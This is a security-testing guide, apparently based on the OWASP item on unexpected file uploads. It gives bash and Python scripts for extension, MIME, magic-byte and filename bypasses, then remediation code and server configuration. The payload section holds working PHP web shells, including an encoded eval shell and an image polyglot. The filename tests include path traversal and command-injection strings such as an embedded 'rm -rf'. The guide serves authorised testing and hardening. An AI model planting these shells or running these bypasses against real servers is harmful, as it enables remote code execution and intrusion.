# WSTG-BUSL-08: Test Upload of Unexpected File Types

## Test ID
WSTG-BUSL-08

## Test Name
Test Upload of Unexpected File Types

## High-Level Description

File upload functionality is a common attack vector where attackers attempt to upload malicious files that can lead to remote code execution, denial of service, or information disclosure. This test examines whether the application properly validates uploaded files and rejects unexpected or dangerous file types. Proper file upload validation should check file extensions, MIME types, and file content signatures.

---

## What to Check

### Validation Points

- [ ] File extension filtering
- [ ] MIME type validation
- [ ] Magic number/file signature verification
- [ ] File content inspection
- [ ] File size limits
- [ ] Filename sanitization
- [ ] Upload directory permissions

### Dangerous File Types

| Category | Extensions |
|----------|------------|
| Web shells | .php, .asp, .aspx, .jsp, .jspx |
| Scripts | .sh, .bash, .ps1, .bat, .cmd |
| Executables | .exe, .dll, .so, .elf |
| Archives | .zip, .tar, .gz (may contain malicious files) |
| Office macros | .docm, .xlsm, .pptm |

---

## How to Test

### Step 1: Identify File Upload Endpoints

```bash
# Find upload endpoints
curl -s "https://target.com/api/upload" -X OPTIONS

# Check for file upload forms
curl -s "https://target.com" | grep -i "file\|upload\|input.*type=.file"

# Common upload endpoints
/api/upload
/api/files
/api/images
/api/documents
/upload
/attachments
/media/upload
```

### Step 2: Test Extension Bypass

```bash
#!/bin/bash
# Test various extension bypass techniques

TARGET="https://target.com/api/upload"
TOKEN="your_token"

# Create PHP shell
echo '<?php echo "Test"; ?>' > shell.php

# Test different extensions
extensions=(
    "php"
    "php3"
    "php4"
    "php5"
    "phtml"
    "phar"
    "php.jpg"
    "php.png"
    "jpg.php"
    "PhP"
    "pHp"
    "php "
    "php."
    "php%00.jpg"
    "php::$DATA"
)

for ext in "${extensions[@]}"; do
    cp shell.php "test.$ext"

    response=$(curl -s -X POST "$TARGET" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@test.$ext")

    echo "$ext: $response"
    rm "test.$ext"
done
```

### Step 3: Test MIME Type Manipulation

```bash
#!/bin/bash
# Test MIME type bypass

# PHP shell disguised as image
echo '<?php echo "Test"; ?>' > shell.php

# Upload with different MIME types
mime_types=(
    "image/jpeg"
    "image/png"
    "image/gif"
    "application/octet-stream"
    "text/plain"
)

for mime in "${mime_types[@]}"; do
    response=$(curl -s -X POST "https://target.com/api/upload" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@shell.php;type=$mime")

    echo "MIME $mime: $response"
done
```

### Step 4: Test Double Extensions

```bash
# Test double extension bypass
extensions=(
    "test.php.jpg"
    "test.php.png"
    "test.jpg.php"
    "test.php.gif"
    "test.php%00.jpg"
    "test.php;.jpg"
    "test.php/jpg"
)

for filename in "${extensions[@]}"; do
    echo '<?php echo "Test"; ?>' > "$filename"

    response=$(curl -s -X POST "https://target.com/api/upload" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@$filename")

    echo "$filename: $response"
    rm "$filename" 2>/dev/null
done
```

### Step 5: Test Magic Bytes Bypass

```bash
# Create file with image magic bytes + PHP code
# GIF header + PHP
printf 'GIF89a\n<?php echo "Test"; ?>' > shell.gif.php

# PNG header + PHP
printf '\x89PNG\r\n\x1a\n<?php echo "Test"; ?>' > shell.png.php

# JPEG header + PHP
printf '\xFF\xD8\xFF\xE0<?php echo "Test"; ?>' > shell.jpg.php

# Test uploads
for file in shell.gif.php shell.png.php shell.jpg.php; do
    response=$(curl -s -X POST "https://target.com/api/upload" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@$file")

    echo "$file: $response"
done
```

### Step 6: Test File Size Limits

```bash
# Test file size limits
# Create large file
dd if=/dev/zero of=large_file.jpg bs=1M count=100 2>/dev/null

response=$(curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@large_file.jpg")

echo "100MB file: $response"

# Test size in request header manipulation
curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Length: 1000" \
    -F "file=@large_file.jpg"

rm large_file.jpg
```

### Step 7: Test Filename Sanitization

```bash
# Test malicious filenames
filenames=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\config\\sam"
    "test<script>.jpg"
    "test\"; rm -rf /*.jpg"
    "test\`id\`.jpg"
    "test|whoami.jpg"
    "CON.jpg"
    "NUL.jpg"
    "test\x00.jpg"
)

touch test.jpg

for name in "${filenames[@]}"; do
    response=$(curl -s -X POST "https://target.com/api/upload" \
        -H "Authorization: Bearer $TOKEN" \
        -F "file=@test.jpg;filename=$name")

    echo "Filename '$name': $response"
done
```

---

## Tools

### Manual Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Request manipulation | Modify upload requests |
| **curl** | CLI HTTP client | Upload testing |
| **exiftool** | Metadata manipulation | Add payloads to metadata |

### Payload Generation

| Tool | Description |
|------|-------------|
| **msfvenom** | Shell generation |
| **weevely** | PHP agent generator |
| **p0wny-shell** | PHP web shell |

---

## Example Commands/Payloads

### PHP Web Shell Variants

```php
// Basic shell
<?php system($_GET['cmd']); ?>

// Encoded shell
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

// Image polyglot (GIF89a + PHP)
GIF89a
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}
?>

// .htaccess override (if uploadable)
AddType application/x-httpd-php .jpg

// Short tags
<?=`$_GET[0]`?>
```

### Upload Test Script

```python
#!/usr/bin/env python3
import requests
import os

class FileUploadTester:
    def __init__(self, upload_url, token):
        self.url = upload_url
        self.headers = {"Authorization": f"Bearer {token}"}
        self.results = []

    def test_extension(self, content, extension, mime_type="application/octet-stream"):
        """Test file with specific extension"""
        files = {
            'file': (f'test.{extension}', content, mime_type)
        }

        try:
            response = requests.post(
                self.url,
                headers=self.headers,
                files=files
            )

            return {
                "extension": extension,
                "mime": mime_type,
                "status": response.status_code,
                "accepted": response.status_code in [200, 201],
                "response": response.text[:200]
            }
        except Exception as e:
            return {"extension": extension, "error": str(e)}

    def test_all_extensions(self):
        """Test dangerous extensions"""
        php_content = b'<?php echo "test"; ?>'

        dangerous_extensions = [
            # PHP variants
            ("php", "application/x-php"),
            ("php3", "application/x-php"),
            ("php4", "application/x-php"),
            ("php5", "application/x-php"),
            ("phtml", "application/x-php"),
            ("phar", "application/x-php"),
            # ASP/ASPX
            ("asp", "text/asp"),
            ("aspx", "text/aspx"),
            # JSP
            ("jsp", "text/x-jsp"),
            ("jspx", "text/x-jspx"),
            # Scripts
            ("sh", "application/x-sh"),
            ("py", "text/x-python"),
            # Executables
            ("exe", "application/x-msdownload"),
        ]

        for ext, mime in dangerous_extensions:
            result = self.test_extension(php_content, ext, mime)
            self.results.append(result)

            if result.get("accepted"):
                print(f"[VULN] Accepted: {ext} ({mime})")

    def test_bypass_techniques(self):
        """Test extension bypass techniques"""
        php_content = b'<?php echo "test"; ?>'

        bypass_tests = [
            ("php.jpg", "image/jpeg"),
            ("php.png", "image/png"),
            ("jpg.php", "image/jpeg"),
            ("php%00.jpg", "image/jpeg"),
            ("php::$DATA", "application/octet-stream"),
            ("PhP", "application/x-php"),
            ("php ", "application/x-php"),
            ("php.", "application/x-php"),
        ]

        print("\n=== Bypass Techniques ===")
        for ext, mime in bypass_tests:
            result = self.test_extension(php_content, ext, mime)
            self.results.append(result)

            status = "[VULN]" if result.get("accepted") else "[BLOCKED]"
            print(f"{status} {ext} ({mime})")

    def test_magic_bytes_bypass(self):
        """Test bypassing with magic bytes"""
        # GIF with PHP
        gif_php = b'GIF89a\n<?php echo "test"; ?>'

        # PNG with PHP
        png_php = b'\x89PNG\r\n\x1a\n<?php echo "test"; ?>'

        # JPEG with PHP
        jpg_php = b'\xFF\xD8\xFF\xE0<?php echo "test"; ?>'

        tests = [
            (gif_php, "shell.gif", "image/gif"),
            (gif_php, "shell.gif.php", "image/gif"),
            (png_php, "shell.png", "image/png"),
            (png_php, "shell.png.php", "image/png"),
            (jpg_php, "shell.jpg", "image/jpeg"),
            (jpg_php, "shell.jpg.php", "image/jpeg"),
        ]

        print("\n=== Magic Bytes Bypass ===")
        for content, filename, mime in tests:
            files = {'file': (filename, content, mime)}
            response = requests.post(self.url, headers=self.headers, files=files)

            status = "[VULN]" if response.status_code in [200, 201] else "[BLOCKED]"
            print(f"{status} {filename}: {response.status_code}")

    def generate_report(self):
        """Generate test report"""
        print("\n=== FILE UPLOAD TEST REPORT ===")

        accepted = [r for r in self.results if r.get("accepted")]
        blocked = [r for r in self.results if not r.get("accepted")]

        print(f"\nTotal tests: {len(self.results)}")
        print(f"Accepted (potential vulnerabilities): {len(accepted)}")
        print(f"Blocked: {len(blocked)}")

        if accepted:
            print("\n--- VULNERABILITIES ---")
            for r in accepted:
                print(f"  Extension: {r['extension']}, MIME: {r.get('mime', 'N/A')}")

# Usage
tester = FileUploadTester("https://target.com/api/upload", "auth_token")
tester.test_all_extensions()
tester.test_bypass_techniques()
tester.test_magic_bytes_bypass()
tester.generate_report()
```

---

## Remediation Guide

### 1. Whitelist-Based Extension Validation

```python
import os

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'doc', 'docx'}

def validate_extension(filename):
    """Validate file extension using whitelist"""
    if not filename or '.' not in filename:
        return False

    # Get actual extension (handle double extensions)
    ext = filename.rsplit('.', 1)[1].lower()

    return ext in ALLOWED_EXTENSIONS

def secure_filename(filename):
    """Generate secure filename"""
    import uuid
    import re

    # Remove path separators
    filename = os.path.basename(filename)

    # Remove dangerous characters
    filename = re.sub(r'[^\w\s\-\.]', '', filename)

    # Generate unique name
    ext = filename.rsplit('.', 1)[1].lower() if '.' in filename else ''
    new_name = f"{uuid.uuid4().hex}.{ext}" if ext else uuid.uuid4().hex

    return new_name
```

### 2. Magic Number Validation

```python
import magic

ALLOWED_MIMES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf'
}

def validate_file_content(file_data):
    """Validate file using magic numbers"""
    mime = magic.Magic(mime=True)
    detected_type = mime.from_buffer(file_data[:2048])

    return detected_type in ALLOWED_MIMES, detected_type
```

### 3. Comprehensive Upload Handler

```python
import os
import uuid
import magic
import hashlib
from PIL import Image
from io import BytesIO

class SecureUploader:
    ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
    ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}
    MAX_SIZE = 5 * 1024 * 1024  # 5MB

    def __init__(self, upload_dir):
        self.upload_dir = upload_dir

    def validate_and_save(self, file_data, original_filename):
        """Comprehensive file validation and save"""

        # 1. Size check
        if len(file_data) > self.MAX_SIZE:
            raise ValueError("File too large")

        # 2. Extension check
        ext = original_filename.rsplit('.', 1)[1].lower() if '.' in original_filename else ''
        if ext not in self.ALLOWED_EXTENSIONS:
            raise ValueError("Extension not allowed")

        # 3. Magic number check
        mime = magic.Magic(mime=True)
        detected_mime = mime.from_buffer(file_data[:2048])
        if detected_mime not in self.ALLOWED_MIMES:
            raise ValueError(f"File type not allowed: {detected_mime}")

        # 4. For images, validate it's actually an image
        if detected_mime.startswith('image/'):
            try:
                img = Image.open(BytesIO(file_data))
                img.verify()  # Verify it's a valid image
            except Exception:
                raise ValueError("Invalid image file")

        # 5. Generate secure filename
        file_hash = hashlib.sha256(file_data).hexdigest()[:16]
        secure_name = f"{uuid.uuid4().hex}_{file_hash}.{ext}"

        # 6. Save to upload directory (outside web root ideally)
        save_path = os.path.join(self.upload_dir, secure_name)

        # Ensure path traversal not possible
        if not os.path.abspath(save_path).startswith(os.path.abspath(self.upload_dir)):
            raise ValueError("Invalid path")

        with open(save_path, 'wb') as f:
            f.write(file_data)

        return secure_name
```

### 4. Server Configuration

```nginx
# Nginx - Disable script execution in upload directory
location /uploads {
    location ~ \.php$ {
        deny all;
    }

    # Add more patterns as needed
    location ~ \.(aspx?|jsp|jspx|sh|py|pl|cgi)$ {
        deny all;
    }
}
```

```apache
# Apache - Disable script execution
<Directory "/var/www/html/uploads">
    # Disable PHP
    php_flag engine off

    # Remove handlers
    RemoveHandler .php .phtml .php3 .php4 .php5 .phps

    # Force download
    ForceType application/octet-stream
    Header set Content-Disposition attachment
</Directory>
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Web shell upload (RCE) | 9.8 | Critical |
| Executable upload | 9.8 | Critical |
| Path traversal via filename | 7.5 | High |
| No file type validation | 8.8 | High |
| Size limit bypass | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-434** | Unrestricted Upload of File with Dangerous Type | Web shell upload |
| **CWE-20** | Improper Input Validation | Missing file validation |
| **CWE-79** | Cross-site Scripting | HTML/SVG file upload |

---

## References

- [OWASP WSTG - Test Upload of Unexpected File Types](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

---

## Checklist

```
[ ] File upload endpoints identified
[ ] Extension whitelist tested
[ ] Extension bypass tested (double ext, null byte)
[ ] MIME type manipulation tested
[ ] Magic bytes bypass tested
[ ] File size limits tested
[ ] Filename sanitization tested
[ ] Path traversal via filename tested
[ ] Upload directory permissions checked
[ ] Server-side execution prevention verified
[ ] Findings documented
[ ] Remediation recommendations provided
```
